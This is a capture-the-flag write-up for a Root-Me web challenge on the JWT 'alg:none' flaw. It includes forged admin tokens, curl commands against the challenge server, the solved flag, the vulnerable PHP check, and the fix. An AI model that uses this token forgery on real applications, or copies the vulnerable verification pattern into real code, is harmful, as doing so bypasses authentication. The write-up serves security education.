# Root-Me — Web-Server: JWT - Introduction (ch58) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch58/
**Challenge:** Secure token exchange (20 pts, author Kn0wledge)
**Goal:** To validate the challenge, connect as admin.

## Flag

```
S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```

## Vulnerability

The app issues a JWT in the `jwt` cookie and trusts the **`alg` header field from the
token itself** instead of pinning the expected algorithm server-side. Declaring
`"alg":"none"` makes the server skip signature verification entirely, so any payload can
be forged by simply leaving the signature part empty.

This is CWE-347 (Improper Verification of Cryptographic Signature) — the classic
"algorithm confusion / `alg:none`" JWT flaw.

## Step by step

### 1. Get a token
The login page offers a guest login at `index.php?guest`, which 302s and sets the cookie:

```
Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```

Decoded:

| Part | Value |
|---|---|
| header  | `{"typ":"JWT","alg":"HS256"}` |
| payload | `{"username":"guest"}` |
| alg     | HS256 (HMAC-SHA256) |

### 2. Confirm the baseline
Sending the untampered guest token returns:

```
Welcome guest to this website! :)
```

So the cookie really is the auth mechanism.

### 3. Forge the token with `alg: none`
Header → `{"typ":"JWT","alg":"none"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`
Payload → `{"username":"admin"}` → `eyJ1c2VybmFtZSI6ImFkbWluIn0`
Signature → **empty** (just leave the trailing dot)

```bash
curl -s "http://challenge01.root-me.org/web-serveur/ch58/index.php" \
  -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
```

Result:

```
Welcome admin to this website! :)
You can validate the challenge with the flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```

### 4. Differential / negative controls
Verified that the bypass is caused by the `alg` field and not by anything else:

| Token sent | Response |
|---|---|
| valid guest token (`alg:HS256`, correct sig) | `Welcome guest to this website!` |
| `alg:HS256`, payload tampered to admin, **old signature kept** | `Wrong signature.` |
| `alg:HS256`, admin payload, **empty signature** | login form (rejected) |
| `alg:none`, admin payload, empty signature | **`Welcome admin` + flag** |
| `alg:None` (capital N), admin payload, empty signature | login form (rejected) |

Two useful details from the controls:
- The signature check *does* run for HS256 — the bypass is specifically the `none` branch.
- The `alg` comparison is **case-sensitive**: `"None"` is not accepted, only lowercase `"none"`.

## One-liner

```bash
curl -s "http://challenge01.root-me.org/web-serveur/ch58/index.php" \
  -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0." \
  | grep -o 'flag : [^<]*'
```

## Root cause & fix

Vulnerable pattern — the algorithm is taken from attacker-controlled input:

```php
$header = json_decode(b64url_decode(explode('.', $jwt)[0]), true);
if ($header['alg'] === 'none') {
    $valid = true;                 // <-- no signature check at all
} elseif ($header['alg'] === 'HS256') {
    $valid = hash_hmac('sha256', "$h.$p", $secret) === $sig;
}
```

Fix: never trust `alg` from the token. Pin the expected algorithm in code
(`firebase/php-jwt` does this when you pass `['HS256']` to `JWT::decode()`), and reject
`none` unconditionally.
